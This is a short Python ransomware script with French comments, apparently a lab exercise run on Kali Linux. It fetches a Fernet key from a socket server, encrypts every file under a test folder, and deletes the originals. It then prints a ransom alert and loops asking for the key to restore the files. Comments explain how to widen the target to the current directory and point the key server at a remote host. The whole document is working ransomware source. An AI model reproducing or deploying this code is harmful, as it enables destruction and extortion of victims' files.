#! /usr/bin/python3

from cryptography.fernet import Fernet
import socket, os

#Fonction de chiffrement
def encrypt(path) :
	with open(path, "rb") as file :
		with open(path + ".encrypt", "wb") as efile :
			econtent = ft.encrypt(file.read())
			efile.write(econtent)
			efile.close()
		file.close()
	os.remove(path)
		

#Fonction de déchiffrement
def decrypt(path) :
	with open(path, "rb") as efile :
		with open(path[:-8], "wb") as file : #-8 pour l'ajout de ".encrypt"
			dcontent = ft.decrypt(efile.read())
			file.write(dcontent)
			file.close()
		efile.close()
	os.remove(path)

#Socket client
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPv4, TCP
s.connect(("127.0.0.1", 1234)) #Localhost à changer
s.send(b"cle") #Clé aléatoire et complexe à implémenter
cle = s.recv(2048)
s.close()

#Objet de Fernet
ft = Fernet(cle)

#Chiffrement
for path, dirs, files in os.walk("/home/kali/Documents/Test/") : #Mettre "./" pour tout chiffrer
	for elem in files :
		encrypt(os.path.join(path, elem))

#Suppression de la clé de de l'objet de fernet
del cle
del ft

#Alerte du ransomware
print("Vous fichiers ont été chiffrés !\n")

#Boucle infini pour déchiffrer 
while True :
	cle = input("Entrez la clé : ")
	ft = Fernet(cle)
	try : 
		for path, dirs, files in os.walk("/home/kali/Documents/Test/") : #Mettre "./" pour tout déchiffrer
			for elem in files :
				decrypt(os.path.join(path, elem))
		print("Vous fichiers ont été restaurés")
	except Exception as exception :
		print("Error : ", exception)
	else :
		break

